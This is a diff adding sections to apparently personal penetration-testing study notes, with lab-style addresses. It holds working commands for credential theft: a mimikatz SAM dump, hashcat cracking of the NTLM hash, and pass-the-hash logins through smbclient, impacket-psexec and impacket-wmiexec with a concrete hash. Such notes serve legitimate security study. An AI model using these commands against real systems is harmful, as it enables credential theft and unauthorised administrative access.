@@ -83,6 +83,43 @@ The following 4 hash-modes match the structure of your input hash:
    3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
    #<SNIP>
 ```
+## Cracking NTLM
+```powershell
+# Getting all users
+Get-LocalUser
+
+# mimikatz (open with elevated privileged)
+.\mimikatz.exe
+
+## inside mimikatz
+
+# see out privilege
+mimikatz # privilege::debug
+
+# elevate to system
+mimikatz # token::elevate
+
+# dump the SAM database
+lsadump::sam
+```
+
+```shell
+# hashcat to crack
+hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+```
+
+## Passing NTLM
+```shell
+# pass the hash to SMB service
+smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash <-hash->
+
+# use PSexec (this will get nt-authority)
+# don't forget to add LM hash as 16*0
+impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+
+#wmiexec (get the ntlm owner shell)
+impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
 
 ## Password Manager
 
@@ -110,3 +147,5 @@ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/has
 
 
 
+
+```
